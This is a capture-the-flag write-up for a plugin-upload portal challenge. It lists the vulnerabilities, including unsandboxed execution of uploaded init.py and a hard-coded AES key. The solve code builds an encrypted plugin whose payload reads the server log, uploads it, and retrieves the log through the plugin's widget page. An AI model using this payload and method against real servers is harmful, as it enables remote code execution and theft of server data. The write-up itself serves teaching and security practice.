# Money

![Proof](proof.png)

**Author:** `stancium`   
**Solve:** 61

---

## Description

This isn't wordpress...

We get: `Hidden_in_the_Cartridge.7z`
---

## Vulnerabilities

* Arbitrary Code Execution: Uploaded `init.py` is executed with `subprocess.run([...], cwd=plugin_dir)` with no sandboxing.
* Hard-coded symmetric key: `KEY = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"` allows anyone to craft valid `.plugin` packages.
* Log exposure vector: Flag is printed to stdout by the official plugin and captured in `/opt/app/app.log`.
* Store gating by plugin count: Downloading from `/store` is gated by `len(registry) > 2`, which can be trivially reached by uploading benign plugins.

---

## Exploit Overview

1. Build a valid `.plugin` archive (zip), place an `init.py` that reads `/opt/app/app.log` and writes it into the plugin's own `index.html`.
2. Encrypt the zip using the known AES-CBC key (prepend a random IV), producing a `.plugin` file.
3. Upload the `.plugin` to the portal. The server will decrypt, extract, and execute `init.py`.
4. Visit `/widget/<your-uid>` — the server will serve the `index.html` you created, which contains the contents of the server log, including the flag line.
5. Parse the flag from the served page (it appears as `You cannot see this MUHAHAHAHA: <FLAG>` in the log).

---

## Solve.py

### 1. Payload that runs on the server:
```python
INIT_PY = r'''
import os, html
from pathlib import Path
plug = Path(__file__).resolve().parent
src = "/opt/app/app.log"
try:
    data = Path(src).read_text(errors="ignore")
except Exception as e:
    data = f"[read error] {e}"
html_out = "<!doctype html><meta charset='utf-8'><title>log</title><pre>" + html.escape(data) + "</pre>"
(plug / "index.html").write_text(html_out)
print("ok")
'''
```
This string becomes the init.py file inside the plugin ZIP.   
When the server executes init.py, it:
  Reads /opt/app/app.log (where the server logged the official plugin’s stdout that contains the flag).   
  Builds a minimal HTML page wrapping the log (escaped so it’s safe to view).   
  Writes that page to index.html inside the plugin directory.   
  Prints "ok" to stdout (server captures stdout in logs too).   
Result: after upload + execution, visiting /widget/<uid> will serve the index.html we just wrote (i.e., the server log).   


### 2. Build plugin ZIP (in-memory)

Create a ZIP containing the files the portal expects:
- plugin_manifest.json   # {"name": NAME, "version":"1.0", "author":"me", "icon":"thumbnail.svg"}
- thumbnail.svg          # small dashboard icon
- index.html             # placeholder (payload will overwrite this on the server)
- init.py                # the payload (INIT_PY) shown above

### 3. Encrypt to .plugin format

The server expects a .plugin file to be the IV (16 bytes) followed by AES-CBC(KEY, Padded(ZIP)). Steps:
```python
iv = os.urandom(16)                         # random 16-byte IV
ciphertext = AES.new(KEY, AES.MODE_CBC, iv).encrypt(pad(zip_bytes, AES.block_size))
plugin_blob = iv + ciphertext               # file contents to upload
*Because the server uses a hard-coded key (KEY) we can produce a valid .plugin.
```

### 4. Upload the plugin

POST the .plugin to /upload as multipart form data:
```python
files = {'file': ('exploit.plugin', plugin_blob, 'application/octet-stream')}
requests.post(f"{BASE}/upload", files=files)
```

On the server this triggers:
```bash
Save uploaded file.
Decrypt using KEY.
Extract the zip into a new plugins/<uid>/ directory.
Execute init.py with subprocess.run(..., cwd=plugin_dir) — our payload runs now.
```

### 5. Find your plugin UID on the dashboard

After upload the dashboard (/) shows a widget card for the plugin. Scrape it to get the UID:
```python
<a class="link" href="/widget/<uid>">LOG_RIPPER</a>
```
The UID is used to fetch /widget/<uid> which serves that plugin’s index.html.

### 6. Fetch the widget page (exfiltrate the log)

GET /widget/<uid> — the server will now serve the index.html our payload wrote, which contains the escaped contents of /opt/app/app.log.

Save it locally for inspection:
```python
page = requests.get(f"{BASE}/widget/{uid}").text
open("widget_log.html","w").write(page)
```



### Flag:  CTF{9fb64c8a4d81f9d0e1f4108467bee58db112d0d1457fa3716cc6a46231803686}